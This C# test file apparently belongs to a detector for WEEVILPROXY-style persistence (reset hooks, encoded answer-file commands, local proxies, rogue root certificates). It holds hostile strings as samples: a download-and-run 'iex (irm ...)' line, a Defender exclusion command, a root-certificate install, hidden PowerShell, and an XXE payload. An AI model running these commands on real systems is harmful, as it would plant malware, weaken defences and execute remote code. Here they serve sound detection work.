using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Spor.Modules;
using Xunit;

namespace Spor.Tests
{
    /// <summary>
    /// Spor 0.9.0: reset and setup hooks and the other traces of WEEVILPROXY (WithSecure, May 2026) and malware like it: a task copy and
    /// .reg export restored by ResetConfig.xml after "Reset this PC", an autounattend.xml with an encoded command, a local
    /// man-in-the-middle proxy, an added root certificate, hidden Settings pages, patched browser extensions, headless browsers, and
    /// the family's names (Autodetect). Strings from the report and from the logs of an infected PC; a benign twin for each.
    /// </summary>
    public class WeevilProxyTests
    {
        // ---------------- ResetConfig.xml and its scripts ----------------

        const string ResetConfig = @"<?xml version=""1.0"" encoding=""utf-8""?>
<Reset>
  <Run Phase=""BasicReset_AfterImageApply""><Path>Fix.cmd</Path><Duration>2</Duration></Run>
  <Run Phase=""FactoryReset_AfterImageApply""><Path>C:\Recovery\OEM\Fix.cmd</Path><Duration>2</Duration></Run>
</Reset>";

        [Fact]
        public void TheRunPhasesOfAResetConfig()
        {
            var runs = ResetHooks.ResetRuns(ResetConfig);
            Assert.Equal(new[] { ("BasicReset_AfterImageApply", "Fix.cmd"), ("FactoryReset_AfterImageApply", @"C:\Recovery\OEM\Fix.cmd") }, runs);
        }

        [Fact]
        public void XmlFromADiskNeverResolvesADtd()
        {
            var evil = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///C:/Windows/win.ini\">]><Reset><Run Phase=\"a\"><Path>&x;</Path></Run></Reset>";
            Assert.Null(ResetHooks.Xml(evil));
            Assert.Empty(ResetHooks.ResetRuns(evil));
            Assert.Null(ResetHooks.Xml("<Reset><Run"));   // malformed
            Assert.Null(ResetHooks.Xml(new string(' ', ResetHooks.MaxText + 1) + "<a/>"));   // too big
        }

        const string MalwareCmd = "@echo off\r\nrem restore\r\ncopy /y \"C:\\Recovery\\OEM\\MicrosoftHealthCheckerV1-atwbpi\" \"C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Guard\\MicrosoftHealthCheckerV1-atwbpi\"\r\nreg import \"C:\\Recovery\\OEM\\task.reg\"\r\n";
        const string OemCmd = "rem PC maker: keep the answer file and the support settings\r\ncopy C:\\Recovery\\OEM\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml\r\nreg import C:\\Recovery\\OEM\\oemsettings.reg\r\n";

        [Fact]
        public void AScriptThatRestoresATaskIsAHook()
        {
            var cmds = ResetHooks.Commands(MalwareCmd);
            Assert.Equal(2, cmds.Count);   // no @echo off, no rem
            Assert.Contains("restores a scheduled task or the machine ID", ResetHooks.Reasons(cmds));
        }

        [Fact]
        public void APcMakersScriptIsNot() => Assert.Empty(ResetHooks.Reasons(ResetHooks.Commands(OemCmd)));

        [Fact]
        public void ARegFileThatWritesTaskCacheRestoresATask()
        {
            var reg = "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\Guard\\MicrosoftHealthCheckerV1-atwbpi]\r\n\"Id\"=\"{429B7957-DE1D-4CAF-A23F-028C70244C02}\"\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]\r\n\"OldMachineGuid\"=\"0e3c-...\"\r\n";
            Assert.True(ResetHooks.RestoresTask(reg));
            Assert.Equal(2, ResetHooks.RegKeys(reg).Count);
            Assert.False(ResetHooks.RestoresTask("[HKEY_LOCAL_MACHINE\\SOFTWARE\\OEM\\Support]\r\n\"Phone\"=\"123\"\r\n"));
        }

        [Fact]
        public void ACopyOfATaskIsRecognized()
        {
            Assert.True(ResetHooks.IsTaskXml("<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"></Task>"));
            Assert.False(ResetHooks.IsTaskXml(ResetConfig));
        }

        // ---------------- answer files ----------------

        static string B64(string s) => Convert.ToBase64String(Encoding.Unicode.GetBytes(s));

        [Fact]
        public void AnAnswerFilesCommandsAreReadAndDecoded()
        {
            var enc = B64("Register-ScheduledTask -TaskName X -Xml (Get-Content C:\\Recovery\\OEM\\x)");
            var xml = "<unattend xmlns=\"urn:schemas-microsoft-com:unattend\"><settings pass=\"oobeSystem\"><component name=\"Microsoft-Windows-Shell-Setup\">" +
                      "<FirstLogonCommands><SynchronousCommand><Order>1</Order><CommandLine>powershell -nop -w hidden -enc " + enc + "</CommandLine></SynchronousCommand></FirstLogonCommands>" +
                      "<AutoLogon><Password><Value>secret</Value></Password><Username>x</Username></AutoLogon></component></settings>" +
                      "<settings pass=\"specialize\"><component><RunSynchronous><RunSynchronousCommand><Path>cmd /c echo hi</Path></RunSynchronousCommand></RunSynchronous></component></settings></unattend>";
            var cmds = ResetHooks.AnswerCommands(xml, out var autoLogon);
            Assert.True(autoLogon);
            Assert.Equal(new[] { "FirstLogonCommands", "RunSynchronousCommand" }, cmds.Select(x => x.Kind));
            Assert.StartsWith("Register-ScheduledTask -TaskName X", ResetHooks.Decoded(cmds[0].Command));
            var why = ResetHooks.Reasons(cmds.Select(x => x.Command));
            Assert.Contains("encoded command", why);
        }

        [Theory]
        [InlineData("powershell -ec ")]
        [InlineData("powershell -EncodedCommand ")]
        [InlineData("powershell /enc ")]
        public void EncodedCommandSpellings(string prefix) => Assert.Equal("whoami", ResetHooks.Decoded(prefix + B64("whoami")));

        [Fact]
        public void NoEncodedCommandNoDecoding()
        {
            Assert.Null(ResetHooks.Decoded("powershell -ExecutionPolicy Bypass -File x.ps1"));
            Assert.Null(ResetHooks.Decoded("powershell -enc not!base64"));
        }

        // ---------------- proxy, certificates, Settings pages ----------------

        [Theory]
        [InlineData("127.0.0.1:57352", "127.0.0.1", 57352, true)]
        [InlineData("http=127.0.0.1:8080;https=127.0.0.1:8080", "127.0.0.1", 8080, true)]
        [InlineData("localhost:8888", "localhost", 8888, true)]
        [InlineData("10.0.0.5:3128", "10.0.0.5", 3128, true)]
        [InlineData("proxy.example.com:3128", "proxy.example.com", 3128, false)]
        public void ProxyTargets(string value, string host, int port, bool local)
        {
            var t = Network.ProxyTarget(value);
            Assert.Equal((host, port), t.Value);
            Assert.Equal(local, Network.LocalOrLan(t.Value.Host));
        }

        [Fact]
        public void WinHttpsProxyFromItsBinaryValue()
        {
            var proxy = Encoding.ASCII.GetBytes("127.0.0.1:8888");
            var b = BitConverter.GetBytes(0x46).Concat(BitConverter.GetBytes(5)).Concat(BitConverter.GetBytes(3))
                    .Concat(BitConverter.GetBytes(proxy.Length)).Concat(proxy).Concat(BitConverter.GetBytes(0)).ToArray();
            Assert.Equal("127.0.0.1:8888", Network.WinHttpProxy(b));
            var direct = BitConverter.GetBytes(0x46).Concat(BitConverter.GetBytes(5)).Concat(BitConverter.GetBytes(1)).Concat(BitConverter.GetBytes(0)).ToArray();
            Assert.Null(Network.WinHttpProxy(direct));
        }

        [Fact]
        public void TheCertificateInAStoreBlob()
        {
            var cert = new byte[] { 0x30, 0x82, 1, 2, 3 };
            var blob = BitConverter.GetBytes(3).Concat(BitConverter.GetBytes(1)).Concat(BitConverter.GetBytes(4)).Concat(new byte[4])
                       .Concat(BitConverter.GetBytes(32)).Concat(BitConverter.GetBytes(1)).Concat(BitConverter.GetBytes(cert.Length)).Concat(cert).ToArray();
            Assert.Equal(cert, Security.CertFromBlob(blob));
            Assert.Null(Security.CertFromBlob(blob.Take(20).ToArray()));
        }

        [Fact]
        public void HiddenSettingsPages()
        {
            Assert.Equal(new[] { "network-proxy" }, Security.SettingsHidden("hide:network-proxy").Evidence);
            Assert.Equal(new[] { "recovery" }, Security.SettingsHidden("Hide:aicomponents;recovery").Evidence);
            Assert.Empty(Security.SettingsHidden("hide:aicomponents;copilot").Evidence);
            Assert.Single(Security.SettingsHidden("showonly:display").Evidence);
        }

        [Fact]
        public void CertutilAddingARootIsSuspicious()
        {
            Assert.Matches(Rules.PsSus, @"certutil -addstore -f root C:\Windows\Temp\ca.cer");
            Assert.DoesNotMatch(Rules.PsSus, "certutil -hashfile x.exe SHA256");
        }

        // ---------------- browsers ----------------

        [Fact]
        public void AHeadlessBrowserDrivenByAProgram()
        {
            Assert.True(Rules.HeadlessDebug(@"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "msedge.exe --headless=new --remote-debugging-port=9222 --user-data-dir=x"));
            Assert.False(Rules.HeadlessDebug(@"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --remote-debugging-port=9222"));
            Assert.False(Rules.HeadlessDebug(@"C:\Tools\other.exe", "other.exe --headless --remote-debugging-port=1"));
        }

        [Fact]
        public void UnpackedExtensionsAndDeveloperMode()
        {
            var json = "{\"extensions\":{\"ui\":{\"developer_mode\":true},\"settings\":{" +
                       "\"nkbihfbeogaeaoehlefnkodbefgpgknn\":{\"location\":4,\"path\":\"C:\\\\ProgramData\\\\x\\\\metamask\",\"manifest\":{\"name\":\"MetaMask\"}}," +
                       "\"ghbmnnjooekpmoecnnnilnnbdlolhkhi\":{\"location\":1,\"path\":\"ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.0_0\"}}}}";
            var r = BrowserExtensions.Parse(json).Value;
            Assert.True(r.DevMode);
            var x = Assert.Single(r.Unpacked);
            Assert.Equal("MetaMask", x.Name);
            Assert.Equal(@"C:\ProgramData\x\metamask", x.Path);
            Assert.Null(BrowserExtensions.Parse("{not json"));
        }

        // ---------------- places and names ----------------

        [Fact]
        public void TheRecoveryFolderIsADropLocation()
        {
            Assert.True(Rules.DropLocation(@"C:\Recovery\OEM\WindowsEssentials\RuntimeBroker.exe"));
            Assert.True(Rules.InterpreterOutside(@"C:\Recovery\OEM\x\python.exe", @"C:\Windows", _ => false));
        }

        static readonly Autodetect.Db Db = Autodetect.Parse(Autodetect.Embedded());
        static bool Weevil(string kind, string value) => Db.Match(kind, value).Any(p => p.Family == "WEEVILPROXY");

        [Theory]
        [InlineData(@"\Microsoft\Windows\Guard\MicrosoftHealthCheckerV1-atwbpi")]
        [InlineData(@"\MicrosoftPathAgentLegacy")]
        [InlineData(@"\AMDSoftwareHealthCheckerV2")]
        [InlineData(@"\OneDriveInstallerTask")]
        [InlineData(@"\MicrosoftPathUpdaterV2")]
        [InlineData(@"\EdgePathHealthCheckerV12")]
        [InlineData(@"\AMDUpdaterLatest")]
        [InlineData(@"\SystemVersionInstallerLegacy")]
        [InlineData(@"\AMDVersionHealthCheckerLegacy")]
        [InlineData(@"\AMDHealthCheckerV12")]
        [InlineData(@"\OSResourcesUpdaterV1-m1sq")]
        [InlineData(@"\ChromeUserAgentUpdater")]
        public void TheLoadersTaskNames(string task) => Assert.True(Weevil("task", task), task);

        [Theory]
        [InlineData(@"\MicrosoftEdgeUpdateTaskMachineCore")]
        [InlineData(@"\MicrosoftEdgeUpdateTaskMachineUA")]
        [InlineData(@"\OneDrive Standalone Update Task-S-1-5-21-1-2-3-1001")]
        [InlineData(@"\AMDInstallLauncher")]
        [InlineData(@"\GoogleUpdaterTaskSystem142.0.7416.0{3A1A2B3C-0000-1111-2222-333344445555}")]
        [InlineData(@"\Adobe Acrobat Update Task")]
        [InlineData(@"\Intel\Intel Telemetry 3")]
        [InlineData(@"\Microsoft\Windows\WindowsUpdate\Scheduled Start")]
        [InlineData(@"\npcapwatchdog")]
        public void RealTaskNamesAreNot(string task) => Assert.False(Weevil("task", task), task);

        [Theory]
        [InlineData(@"C:\Windows\System32\MicrosoftHealthCheckerV1-atwbpi\node.exe", true)]
        [InlineData(@"C:\Windows\System32\MicrosoftHealthCheckerV1-atwbpi\0.2hycigo6fpu.node", true)]
        [InlineData(@"C:\Windows\System32\DomainAuthHost\node.exe", true)]
        [InlineData(@"C:\Program Files\nodejs\node.exe", false)]
        [InlineData(@"C:\Windows\System32\notepad.exe", false)]
        public void ThePayloadsPlace(string path, bool hit) => Assert.Equal(hit, Weevil("path", path));

        [Fact]
        public void TheLoadersCommandAndTheKeptMachineId()
        {
            Assert.True(Weevil("cmd", "powershell -cOmma Add-MpPreference -ExclusionProcess (Get-Process -PID $PID).MainModule.ModuleName -Force"));
            Assert.True(Weevil("registry", @"HKLM\SOFTWARE\Microsoft\Cryptography\OldMachineGuid"));
            Assert.False(Weevil("registry", @"HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid"));
        }

        // ---------------- Code review regressions ----------------

        [Fact]
        public void WindowsSignedNeedsAMicrosoftSignatureOnASignableType()
        {
            var dir = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "spor-ws-" + Guid.NewGuid().ToString("N"));
            System.IO.Directory.CreateDirectory(dir);
            try
            {
                // .node and .js carry no signature: never "Windows' own", so they are reported in a new System32 folder
                foreach (var n in new[] { "0.abcdefgh.node", "index.js" })
                {
                    var f = System.IO.Path.Combine(dir, n);
                    System.IO.File.WriteAllText(f, "x");
                    Assert.False(Files.WindowsSigned(f), n);
                }
                var exe = System.IO.Path.Combine(dir, "node.exe");
                System.IO.File.WriteAllBytes(exe, new byte[] { 0x4D, 0x5A, 0, 0 });
                Assert.False(Files.WindowsSigned(exe));                                   // unsigned
                Assert.False(Files.WindowsSigned(System.IO.Path.Combine(dir, "missing.exe")));
            }
            finally { System.IO.Directory.Delete(dir, true); }
        }

        [Theory]
        [InlineData("answer", "unattend.xml", true)]
        [InlineData("recovery", "Unattend.xml", true)]
        [InlineData("recovery", "AutoUnattend.xml", true)]
        [InlineData("recovery", "ResetConfig.xml", false)]
        [InlineData("recovery", "task.xml", false)]
        [InlineData("setup", "unattend.xml", false)]
        public void AnAnswerFileInTheRecoveryFolderIsReadAsOne(string where, string name, bool answer) =>
            Assert.Equal(answer, Persistence.AnswerFile(where, name));

        [Fact]
        public void AResetConfigPathWithBadCharactersIsKeptNotThrown()
        {
            Assert.Equal(@"C:\Recovery\OEM\Fix.cmd", Persistence.ScriptPath(@"C:\Recovery\OEM", "Fix.cmd"));
            Assert.Equal(@"D:\x.cmd", Persistence.ScriptPath(@"C:\Recovery\OEM", @"D:\x.cmd"));
            Assert.Null(Persistence.ScriptPath(@"C:\Recovery\OEM", "a|b<c>.cmd"));
        }

        [Fact]
        public void APcMakersScriptRunningItsOwnFilesIsNoReason()
        {
            Assert.Empty(ResetHooks.Reasons(new[] { @"C:\Recovery\OEM\Point_D\Setup.exe /s" }));
            Assert.Empty(ResetHooks.Reasons(new[] { @"start /wait ""C:\Recovery\OEM\Point_D\Setup.exe"" /s" }));
            Assert.Empty(ResetHooks.Reasons(new[] { @"powershell -ExecutionPolicy Bypass -File C:\Recovery\OEM\Point_E\Apply.ps1" }));
            // the same from somewhere else still runs code
            Assert.Contains("runs code", ResetHooks.Reasons(new[] { @"powershell -ExecutionPolicy Bypass -File C:\Users\Public\x.ps1" }));
        }

        [Fact]
        public void APcMakersRegFileIsNoTaskRestore()
        {
            const string maker = "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Vendor\\Settings]\r\n" +
                                 "\"Tool\"=\"C:\\\\Program Files\\\\Vendor\\\\tool.exe /quiet\"\r\n\"Path\"=\"C:\\\\Windows\\\\System32\\\\cmd.exe\"\r\n";
            Assert.False(ResetHooks.RestoresTask(maker));
            const string weevil = "Windows Registry Editor Version 5.00\r\n\r\n" +
                                  "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\Guard\\X]\r\n\"Id\"=\"{1}\"\r\n";
            Assert.True(ResetHooks.RestoresTask(weevil));
            Assert.True(ResetHooks.RestoresTask("[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]\r\n\"OldMachineGuid\"=\"abc\"\r\n"));
        }

        [Fact]
        public void ANewMicrosoftNamedRootIsNotWindowsOwn()
        {
            Assert.True(Security.WindowsOwnRoot("CN=Microsoft Root Certificate Authority 2011", new DateTime(2011, 3, 22)));
            Assert.False(Security.WindowsOwnRoot("CN=Microsoft Secure Server Authority", new DateTime(2025, 6, 1)));
            Assert.False(Security.WindowsOwnRoot("CN=Mitm Proxy CA", new DateTime(2015, 1, 1)));
        }

        [Fact]
        public void EveryProxyEntryIsRead()
        {
            var t = Network.ProxyTargets("ftp=203.0.113.5:21;http=127.0.0.1:57352;https=127.0.0.1:57352");
            Assert.Equal(new[] { ("203.0.113.5", 21), ("127.0.0.1", 57352) }, t);
            Assert.Contains(t, x => Network.LocalOrLan(x.Host));
            Assert.Empty(Network.ProxyTargets(""));
        }

        [Fact]
        public void HeadReadsTheStartOfAPaddedHook()
        {
            var f = System.IO.Path.GetTempFileName();
            try
            {
                var sb = new StringBuilder("schtasks /create /xml C:\\Recovery\\OEM\\t.xml /tn X\r\n");
                sb.Append(' ', ResetHooks.MaxText + 100);
                System.IO.File.WriteAllText(f, sb.ToString(), new UTF8Encoding(false));
                var (text, tooBig) = ResetHooks.Head(f);
                Assert.True(tooBig);
                Assert.Equal(ResetHooks.MaxText, text.Length);
                Assert.StartsWith("schtasks /create", text);
                Assert.Contains("restores a scheduled task or the machine ID", ResetHooks.Reasons(ResetHooks.Commands(text)));
                System.IO.File.WriteAllText(f, "echo hi", Encoding.Unicode);
                var (small, big) = ResetHooks.Head(f);
                Assert.False(big);
                Assert.Equal("echo hi", small);
            }
            finally { System.IO.File.Delete(f); }
        }

        [Fact]
        public void OnlyPowerShellsEncodedCommandIsDecoded()
        {
            Assert.Null(ResetHooks.Decoded("somesetup.exe /e Settings1234567890abcdef"));
            Assert.Null(ResetHooks.Decoded("powershell -e AAAA"));                                  // too short
            Assert.Null(ResetHooks.Decoded("powershell -enc " + Convert.ToBase64String(new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }))); // not text
            var b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes("iex (irm http://x/y)"));
            Assert.Equal("iex (irm http://x/y)", ResetHooks.Decoded("powershell.exe -w hidden -enc " + b64));
        }

        [Fact]
        public void CraftedLengthsDoNotOverflow()
        {
            var blob = new byte[24];
            BitConverter.GetBytes(32).CopyTo(blob, 0);
            BitConverter.GetBytes(int.MaxValue).CopyTo(blob, 8);
            Assert.Null(Security.CertFromBlob(blob));
            BitConverter.GetBytes(-5).CopyTo(blob, 8);
            Assert.Null(Security.CertFromBlob(blob));
            var cert = new byte[] { 0x30, 0x03, 1, 2, 3 };
            var ok = new byte[12 + cert.Length];
            BitConverter.GetBytes(32).CopyTo(ok, 0);
            BitConverter.GetBytes(cert.Length).CopyTo(ok, 8);
            cert.CopyTo(ok, 12);
            Assert.Equal(cert, Security.CertFromBlob(ok));

            var w = new byte[24];
            BitConverter.GetBytes(3).CopyTo(w, 8);
            BitConverter.GetBytes(int.MaxValue).CopyTo(w, 12);
            Assert.Null(Network.WinHttpProxy(w));
            var proxy = Encoding.ASCII.GetBytes("127.0.0.1:8888");
            var good = new byte[16 + proxy.Length + 4];
            BitConverter.GetBytes(3).CopyTo(good, 8);
            BitConverter.GetBytes(proxy.Length).CopyTo(good, 12);
            proxy.CopyTo(good, 16);
            Assert.Equal("127.0.0.1:8888", Network.WinHttpProxy(good));
        }

        // ---------------- First live run (a Lenovo with a factory C:\Recovery\OEM) ----------------

        static readonly string[] NoCommands = new string[0];

        [Fact]
        public void APcMakersOldTaskCopyIsListedNotFlagged()
        {
            // Lenovo's driver package keeps its task XMLs in the factory copy of C: (2022): no script of the reset uses them
            var (fl, why, listed) = Persistence.Judge(hook: true, namedTaskCopy: false, regRestores: false, tooBig: false, recent: false,
                unsigned: false, outsideProgram: null, commands: new[] { "\"%windir%\\system32\\sc.exe\" START ImControllerService" });
            Assert.Empty(fl);
            Assert.Empty(why);
            Assert.True(listed);
        }

        [Fact]
        public void ATaskCopyAResetScriptUsesIsEvidence()
        {
            Assert.True(Persistence.NamedBy("MicrosoftHealthCheckerV1-atwbpi",
                new[] { @"copy /y ""C:\Recovery\OEM\MicrosoftHealthCheckerV1-atwbpi"" ""C:\Windows\System32\Tasks\Microsoft\Windows\Guard\""" }));
            Assert.False(Persistence.NamedBy("data_ImControllerMaintenanceTask.xml", new[] { @"XCOPY %RECOVERY%\C\*.* %CDIR%:\*.* /cherky" }));
            Assert.False(Persistence.NamedBy("a.x", new[] { "a.x" }));   // too short to tell
            var (fl, _, _) = Persistence.Judge(true, true, false, false, false, false, null, NoCommands);
            Assert.Equal(new[] { ResetHooks.HookFlag }, fl);
        }

        [Fact]
        public void APcMakersOldResetScriptIsListedNotFlagged()
        {
            var commands = ResetHooks.Commands(":START\r\nSET RECOVERY=\r\nreg load HKLM\\SoftTemp %CDIR%:\\windows\\system32\\config\\Software\r\n" +
                                               "reg add \"HKLM\\SoftTemp\\Microsoft\\Windows Search\" /v RebuildIndex /t REG_DWORD /d 7 /f\r\nreg unload HKLM\\SoftTemp");
            var (fl, why, listed) = Persistence.Judge(true, false, false, false, false, false, null, commands);
            Assert.Empty(fl);
            Assert.Empty(why);
            Assert.True(listed);
        }

        [Fact]
        public void ARecentHookIsContextUnlessItStartsSomethingOutsideWindows()
        {
            var (fl, why, _) = Persistence.Judge(true, false, false, false, true, false, null, new[] { "xcopy C:\\Windows\\x C:\\y" });
            Assert.Equal(new[] { ResetHooks.ConfigFlag }, fl);
            Assert.Equal(new[] { "written in the time window" }, why);
            (fl, why, _) = Persistence.Judge(true, false, false, false, true, false, @"C:\ProgramData\Guard\loader.exe", new[] { @"C:\ProgramData\Guard\loader.exe" });
            Assert.Equal(new[] { ResetHooks.HookFlag }, fl);
            Assert.Contains(why, w => w.Contains(@"C:\ProgramData\Guard\loader.exe"));
            // what restores a task is evidence however old
            (fl, _, _) = Persistence.Judge(true, false, false, false, false, false, null, new[] { @"schtasks /create /xml C:\Recovery\OEM\t.xml /tn X" });
            Assert.Equal(new[] { ResetHooks.HookFlag }, fl);
        }

        [Theory]
        [InlineData(false, false, false)]   // the PC maker's old, signed program or data file: counted, not listed
        [InlineData(false, true, true)]     // old and not validly signed: listed, no flag
        [InlineData(true, false, true)]     // new: listed
        public void OtherFilesAreListedWhenNewOrUnsigned(bool recent, bool unsigned, bool listed)
        {
            var (fl, _, l) = Persistence.Judge(false, false, false, false, recent, unsigned, null, NoCommands);
            Assert.Equal(listed, l);
            Assert.Empty(fl);
        }

        [Fact]
        public void ANewUnsignedProgramInTheRecoveryFolderIsEvidence()
        {
            var (fl, _, listed) = Persistence.Judge(false, false, false, false, true, true, null, NoCommands);
            Assert.Equal(new[] { ResetHooks.HookFlag }, fl);
            Assert.True(listed);
        }

        [Fact]
        public void LabelsAndSetlocalAreNoCommands()
        {
            Assert.Equal(new[] { "SET RECOVERY=", "xcopy a b" },
                ResetHooks.Commands(":START\r\n@setlocal enabledelayedexpansion\r\nSET RECOVERY=\r\n:: note\r\nxcopy a b\r\n:END\r\nendlocal"));
        }

        [Fact]
        public void TheCommandsThatMatterAreShownFirst()
        {
            var shown = ResetHooks.ShowOrder(new[] { "SET A=1", "SET B=2", @"schtasks /create /xml C:\Recovery\OEM\t.xml /tn X", "echo done" });
            Assert.Equal(@"schtasks /create /xml C:\Recovery\OEM\t.xml /tn X", shown[0]);
            Assert.Equal(new[] { "SET A=1", "SET B=2", "echo done" }, shown.Skip(1));
        }

        [Fact]
        public void TheThumbprintsOfWindowsTrustedRootList()
        {
            var thumb = new byte[20];
            for (int i = 0; i < 20; i++) thumb[i] = (byte)(0x36 + i);
            var ctl = new List<byte> { 0x30, 0x82, 0x01, 0x00, 0x30, 0x1A, 0x04, 0x14 };
            ctl.AddRange(thumb);
            ctl.AddRange(new byte[] { 0x31, 0x00, 0x04, 0x14, 0x01 });   // a cut-off string at the end: ignored
            var set = Security.CtlThumbprints(ctl.ToArray());
            Assert.Single(set);
            Assert.Contains(BitConverter.ToString(thumb).Replace("-", "").ToLowerInvariant(), set);   // any case
            Assert.Empty(Security.CtlThumbprints(null));
        }
    }
}
